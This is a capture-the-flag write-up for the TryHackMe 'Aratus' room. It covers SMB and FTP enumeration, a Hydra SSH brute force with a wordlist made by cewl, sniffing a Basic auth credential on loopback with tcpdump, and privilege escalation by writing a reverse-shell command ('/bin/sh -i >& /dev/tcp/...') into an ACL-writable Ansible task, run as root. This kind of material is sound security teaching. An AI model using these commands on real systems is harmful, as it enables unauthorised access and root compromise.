Room link: https://tryhackme.com/room/aratus

![image](https://user-images.githubusercontent.com/63553752/160260043-ffc1c32e-9d12-43db-b6c6-f590470a1c45.png)

I have an understanding of the foothold since I was watching a friend of mine attempt this room, although he never got the foothold, rather just files from smb, so I knew it was going to be that.
I would say I know what it isn't rather than I know what it is.

#### ENUMERATION:

We run an nmap scan and while that is going on open our browser to see if there's a web interface.

nmap results:

```
┌──(root💀kali)-[~/Documents/thm/aratus]
└─# nmap -sV -sC -sS 10.10.102.251 -oN nmap
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-26 13:22 EDT
Nmap scan report for 10.10.102.251
Host is up (0.096s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Jun 09  2021 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.13.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA)
|   256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA)
|_  256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (ED25519)
80/tcp  open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
|_http-title: Apache HTTP Server Test Page powered by CentOS
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=aratus/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-11-23T12:28:26
|_Not valid after:  2022-11-23T12:28:26
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-ssn Samba smbd 4.10.16 (workgroup: WORKGROUP)
Service Info: Host: ARATUS; OS: Unix

Host script results:
|_clock-skew: mean: -19m58s, deviation: 34m35s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.16)
|   Computer name: aratus
|   NetBIOS computer name: ARATUS\x00
|   Domain name: \x00
|   FQDN: aratus
|_  System time: 2022-03-26T18:22:45+01:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-26T17:22:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.75 seconds
```

FTP, SSH, HTTP and SMB services, great!

Since there's an http service we also run gobuster to see if there are any directories or endpoints we should look at.

The FTP service has an option for anonymous login so that's where we'll take a look first.

```
ftp <target ip>
```
credentials:
```
anonymous
empty password field
```


There's a pub directory on there, but it's empty even when looking with ls -lah (which would show us if there were any hidden files), so we give up on that.

The SSH service I assume we will need later on, and since we're still waiting for gobuster to finish the scan we take a look at the SMB service.

```
┌──(root💀kali)-[~/Documents/thm/aratus]
└─# nmap -p 139,445 --script=smb-enum-users,smb-enum-shares,smb-ls 10.10.102.251 -oN smb-scan.content
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-26 13:28 EDT
Nmap scan report for 10.10.102.251
Host is up (0.073s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: <blank>
|   \\10.10.102.251\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.10.16)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|   \\10.10.102.251\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\drivers
|     Anonymous access: <none>
|   \\10.10.102.251\temporary share: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\simeon
|_    Anonymous access: READ/WRITE
| smb-ls: Volume \\10.10.102.251\temporary share
|   maxfiles limit reached (10)
| SIZE   TIME                 FILENAME
| <DIR>  2022-01-10T13:06:44  .
| <DIR>  2021-11-23T16:24:05  ..
| <DIR>  2021-11-23T10:07:47  chapter1
| <DIR>  2021-11-23T11:07:01  chapter1\paragraph1.1
| <DIR>  2021-11-23T11:07:12  chapter1\paragraph1.2
| <DIR>  2021-11-23T11:08:49  chapter1\paragraph1.3
| <DIR>  2021-11-23T10:08:11  chapter2
| <DIR>  2021-11-23T11:09:16  chapter2\paragraph2.1
| <DIR>  2021-11-23T11:09:21  chapter2\paragraph2.2
| <DIR>  2021-11-23T11:09:29  chapter2\paragraph2.3
|_

Nmap done: 1 IP address (1 host up) scanned in 20.32 seconds
```

So there's a bunch of chapters, on the /temporary share which I assume we will somehow need since the room description mentions reading a lot.
We can use smbclient to check what the temporary share holds.

```
──(root💀kali)-[~/Documents/thm/aratus]
└─# smbclient //10.10.102.251/"temporary share"
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```
When we input the adress we use " " at the beginning and the end of the string since there's an empty space in between the words which won't work unless using apostrophes.

To get all of the files we could use smbget -R to get all of them recursively, but we do not have access one of the hidden files, and I don't know of another way, so the next fastest way was to just go through the chapters with the same command:
```
smbget -R smb://10.10.102.251/"temporary share"/chapter1
```
and after that look at the "message-to-simeon.txt" file.

To do so we need to: 

"get message-to-simeon.txt" to get it onto your machine.

```
┌──(root💀kali)-[~/Documents/thm/aratus]
└─# cat message-to-simeon.txt 
Simeon,

Stop messing with your home directory, you are moving files and directories insecurely!
Just make a folder in /opt for your book project...

Also you password is insecure, could you please change it? It is all over the place now!

- Theodore
```

Before following this up, gobuster ended and it found /cgi-bin, since I've done a few rooms with cgi bin exploits I ran 

https://www.exploit-db.com/exploits/34900

to see if there was anything we could exploit.
It found nothing so we continued looking into the message from above.


Okay, so reading into this I decided to see if ip/simeon offered anything in my browser and it turns out that is where Simeon's book is.

Continued to get all of the chapters and reading them, they all turned out to be lorem ipsum.

```
Also you password is insecure, could you please change it? It is all over the place now!
```

This hinted me that "all over the place" might mean throughout lorem ipsum since it is everywhere.

You could make a wordlist out of one of the text files you got from the SMB service using:

```
cat text1.txt | tr ' ' '\n' > output.txt
```
or you could use cewl with simeon's home directory from the website:

```
┌──(root💀kali)-[~/Documents/thm/aratus]
└─# cewl http://10.10.102.251/simeon/ > wordlist.txt

```
So now that we have a wordlist and a username, we can try to bruteforce it.


```
┌──(root💀kali)-[~/Documents/thm/aratus]
└─# hydra -l simeon -P ~/Documents/thm/aratus/wordlist.txt ssh://10.10.102.251
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-26 13:37:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 207 login tries (l:1/p:207), ~13 tries per task
[DATA] attacking ssh://10.10.102.251:22/
[22][ssh] host: 10.10.102.251   login: simeon   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-26 13:37:59
```
Now we can login through ssh as Simeon!

```
[simeon@aratus ~]$ ls
chapter1  chapter3  chapter5  chapter7  chapter9
chapter2  chapter4  chapter6  chapter8  message-to-simeon.txt
[simeon@aratus ~]$ cat message-to-simeon.txt 
Simeon,
```
Nothing in the landing directory and we couldn't look at the other's directories.

I try 
```
[simeon@aratus tmp]$ find / -name simeon -type f 2>/dev/null
```
but nothing pops up besides /var/spool/mail/simeon

sudo -l also doesn't work since it says I can't run sudo as simeon on aratus.

I attempted to upload linpeas to the machine by hosting a simple server in my /opt directory

```
python3 -m http.server 8000
```
and then trying wget on the aratus machine, but it turns out it doesn't have wget.

So we just use curl instead.

```
[simeon@aratus tmp]$ curl 10.9.13.203:8000/linpeas.sh > linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  744k  100  744k    0     0   627k      0  0:00:01  0:00:01 --:--:--  628k
[simeon@aratus tmp]$ ls
linpeas.sh  systemd-private-88911423075e417789861259a76c8227-httpd.service-WGMALJ
[simeon@aratus tmp]$ chmod +x linpeas.sh
```

Now that we have linpeas and we added permissions for it to be executeable we can go ahead and run it.

Linpeas found as 95% PE vector:
```
Files with capabilities (limited to 50):
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip


/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/simeon/.local/bin:/home/simeon/bin                                                                              
New path exported: /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/simeon/.local/bin:/home/simeon/bin:/sbin:/bin
```

```
╔══════════╣ Can I sniff with tcpdump?
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sniffing              
You can sniff with tcpdump! 
```

Okay, so we can try and see if there's anything going on.

First we try to see if we can sniff with 
```
timeout 1 tcpdump

```

So now we transfer over pspy which is a process monitoring command line tool that we can use without root access.
https://github.com/DominicBreuker/pspy

You only need to download the:
64 bit big, static version: pspy64 
and transfer it over to the victim machine.

We change it to an executable, and then we start snooping on the processes that are happening.

After a while you see an interesting command being ran constantly in intervals

```
2022/03/26 19:21:01 CMD: UID=1001 PID=19178  | /bin/sh -c /usr/bin/python3 /home/theodore/scripts/test-www-auth.py >/dev/null 2>&1                                      
2022/03/26 19:21:01 CMD: UID=0    PID=19180  | /bin/sh -c ping -c 30 127.0.0.1 >/dev/null 2>&1                                                                          
2022/03/26 19:21:01 CMD: UID=1001 PID=19181  | /usr/bin/python3 /home/theodore/scripts/test-www-auth.py     
```

so now we use tcpdump to see if we can locate the traffic

```
╔══════════╣ Interfaces
default 0.0.0.0                                                                     
loopback 127.0.0.0
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:7a:6a:ab:23:75 brd ff:ff:ff:ff:ff:ff
    inet 10.10.102.251/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3389sec preferred_lft 3389sec
    inet6 fe80::7a:6aff:feab:2375/64 scope link 
       valid_lft forever preferred_lft forever
```

These are the interfaces linpeas provided and this matches up with what the processes are pinging in the logs from pspy, the loopback's inet is: 127.0.0.1, so we need to check out lo with tcpdump :)

```
[simeon@aratus tmp]$ tcpdump -i lo -A
```
We have to use the flag -A because otherwise we won't see the packets in ASCII format.

```
-A
Print each packet (minus its link level header) in ASCII. Handy for capturing web pages.
```

Since we're looking for a ping, we can find a GET request in the logs.

```
.;...;..GET /test-auth/index.html HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.14.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Authorization: Basic dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs=
```

```
19:30:01.813913 IP localhost.http > localhost.34232: Flags [P.], seq 1:428, ack 224, win 700, options [nop,nop,TS val 3902720 ecr 3902719], length 427: HTTP: HTTP/1.1 200 OK
E.....@.@.}l.........P....1V...............
.;...;..HTTP/1.1 200 OK
Date: Sat, 26 Mar 2022 18:30:01 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
Last-Modified: Tue, 23 Nov 2021 13:08:49 GMT
ETag: "6d-5d1747131d500"
Accept-Ranges: bytes
Content-Length: 109
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<body>
<h1>Hello there!</h1>
<p>If you read this, the curl command was succesful!</p>
</body>
</html>
```
What we're interested in is:
```
Authorization: Basic [REDACTED]
```

This looks like base64, so we open up CyberChef and choose "From Base64" and we get Theodore's credentials

```
theodore:[REDACTED]
```

So now we just do: 
```
su theodore
```
use his password and voila.

If you go to theodore's home directory you will find the user flag.

Okay, we have access as theodore, but we still need root.

```
[theodore@aratus ~]$ id
uid=1001(theodore) gid=1001(theodore) groups=1001(theodore) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

So we try sudo -l to see if we can find anything, or else we need to get to enumerating again.

```
[theodore@aratus ~]$ sudo -l
Matching Defaults entries for theodore on aratus:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE
    KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User theodore may run the following commands on aratus:
    (automation) NOPASSWD: /opt/scripts/infra_as_code.sh
```

Okay great, this means that we can run /opt/scripts/infra_as_code.sh as user automation with no password.

```
[theodore@aratus ~]$ cat /opt/scripts/infra_as_code.sh
#!/bin/bash
cd /opt/ansible
/usr/bin/ansible-playbook /opt/ansible/playbooks/*.yaml
```
We see in the script 3 file paths are mentioned.
So now we just follow where the script leads us to see if there are any files we can modify or permissions we can play with.

```
[theodore@aratus ~]$ cd /opt/ansible
[theodore@aratus ansible]$ ls
ansible.cfg  inventory  playbooks  README.txt  roles
```
Since playbooks is mentioned in the infra_as_code.sh script we go to that directory.

```
[theodore@aratus playbooks]$ ls -lah
total 20K
drwxr-xr-x. 2 automation automation  99 Nov 23 13:55 .
drwxr-x---. 4 automation theodore    90 Nov 23 17:59 ..
-rw-r--r--. 1 automation automation 156 Nov 23 13:52 firewalld.yaml
-rw-r--r--. 1 automation automation 312 Nov 23 13:50 httpd.yaml
-rw-r--r--. 1 automation automation 140 Nov 23 13:51 smbd.yaml
-rw-r--r--. 1 automation automation 138 Nov 23 13:52 sshd.yaml
-rw-r--r--. 1 automation automation 145 Nov 23 13:55 vsftpd.yaml
```

I don't see any funky easy permissions so I start reading through all of them.

I opened them all up and the thing that stood out is that in httpd.yaml, there's a "roles" mentioned, which is a folder in /opt/ansible so I decide to look into that.

```
[theodore@aratus playbooks]$ cat httpd.yaml
---
- name: Install and configure Apache
  hosts: all
  become: true
  roles:
    - role: geerlingguy.apache
  tasks:
    - name: configure firewall
      firewalld:
        service: "{{ item }}"
        state: enabled
        permanent: yes
        immediate: yes
      loop:
        - http
        - https
```

Alright, so we go to roles.
```
[theodore@aratus ansible]$ cd roles
[theodore@aratus roles]$ ls
geerlingguy.apache
```
And we see we have access to the folder with the same role name.

So we can mess around in that folder and that is great! 

The rest of the httpd.yaml mentions "tasks", and since there's a directory called tasks we look into that.

```
[theodore@aratus geerlingguy.apache]$ cd tasks
[theodore@aratus tasks]$ ls -lah
total 36K
drwxr-xr-x. 2 automation automation  228 Dec  2 11:55 .
drwxr-xr-x. 9 automation automation  178 Dec  2 11:55 ..
-rw-rw-r--. 1 automation automation 1.7K Dec  2 11:55 configure-Debian.yml
-rw-rw-r--+ 1 automation automation 1.1K Dec  2 11:55 configure-RedHat.yml
-rw-rw-r--. 1 automation automation  546 Dec  2 11:55 configure-Solaris.yml
-rw-rw-r--. 1 automation automation  711 Dec  2 11:55 configure-Suse.yml
-rw-rw-r--. 1 automation automation 1.4K Dec  2 11:55 main.yml
-rw-rw-r--. 1 automation automation  193 Dec  2 11:55 setup-Debian.yml
-rw-rw-r--. 1 automation automation  198 Dec  2 11:55 setup-RedHat.yml
-rw-rw-r--. 1 automation automation  134 Dec  2 11:55 setup-Solaris.yml
-rw-rw-r--. 1 automation automation  133 Dec  2 11:55 setup-Suse.yml
```

Okay, so here the file permissions are important.
As you can see there's a + sign for "configure-RedHat.yml", which means there is an ACL attached to this.
ACL = Access Control List, which adds more permissions for file systems to add onto the UNIX ones.

To set these permissions you would use setfacl, and to read them you would use getfacl.

```
[theodore@aratus tasks]$ getfacl configure-RedHat.yml
# file: configure-RedHat.yml
# owner: automation
# group: automation
user::rw-
user:theodore:rw-
group::rw-
mask::rw-
other::r--
```
Our user, theodore, has read and write access to this file, so we can do malicious things.

I open the file and use a reverse shell generated from revshells.com.

I add it in as a command with a name called root, following the syntax for yml files.

- name: root
  command: /bin/sh -i >& /dev/tcp/10.9.13.203/9001 0>&1

```
[theodore@aratus tasks]$ cat configure-RedHat.yml 
---
- name: Configure Apache.
  lineinfile:
    dest: "{{ apache_server_root }}/conf/{{ apache_daemon }}.conf"
    regexp: "{{ item.regexp }}"
    line: "{{ item.line }}"
    state: present
    mode: 0644
  with_items: "{{ apache_ports_configuration_items }}"
  notify: restart apache

- name: Check whether certificates defined in vhosts exist.
  stat: path={{ item.certificate_file }}
  register: apache_ssl_certificates
  with_items: "{{ apache_vhosts_ssl }}"

- name: Add apache vhosts configuration.
  template:
    src: "{{ apache_vhosts_template }}"
    dest: "{{ apache_conf_path }}/{{ apache_vhosts_filename }}"
    owner: root
    group: root
    mode: 0644
  notify: restart apache
  when: apache_create_vhosts | bool

- name: Check if localhost cert exists (RHEL 8 and later).
  stat:
    path: /etc/pki/tls/certs/localhost.crt
  register: localhost_cert
  when: ansible_distribution_major_version | int >= 8

- name: Ensure httpd certs are installed (RHEL 8 and later).
  command: /usr/libexec/httpd-ssl-gencerts
  when:
    - ansible_distribution_major_version | int >= 8
    - not localhost_cert.stat.exists
- name: root
  command: /bin/sh -i >& /dev/tcp/10.9.13.203/9001 0>&1
```

But this turns out not to work :<

I tried adding sudo at the start, still nothing.

```
TASK [geerlingguy.apache : root] *******************************************************************************************************
[WARNING]: Consider using 'become', 'become_method', and 'become_user' rather than running sudo
fatal: [10.10.102.251]: FAILED! => {"changed": true, "cmd": ["sudo", "/bin/sh", "-i", ">&", "/dev/tcp/10.9.13.203/9001", "0>&1"], "delta": "0:00:00.022810", "end": "2022-03-26 20:04:00.938186", "msg": "non-zero return code", "rc": 127, "start": "2022-03-26 20:04:00.915376", "stderr": "sh: >&: No such file or directory", "stderr_lines": ["sh: >&: No such file or directory"], "stdout": "", "stdout_lines": []}
```

Since it does say no such file or directory, I thought that maybe we could create a text file and then just run it with the file we can edit using bash in the command: line.

So we go to /tmp and create a text file called shell.sh containing our shell.

```
/bin/sh -i >& /dev/tcp/10.9.13.203/9001 0>&1
```
We open a listener on our machine with:

```
nc -lvnp 9001
```

Now we just need to run it as root, meaning we have to edit the file with the following:

```
- name: root
  command: sudo bash /tmp/shell.sh
```
This will now run our shell.sh with root access and on our listener we will get the shell.

Now I would stabilize it, but the goal was to get the root flag, so I just do cd /root and find it there, so no need for that.

```
sh-4.2# id
id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```
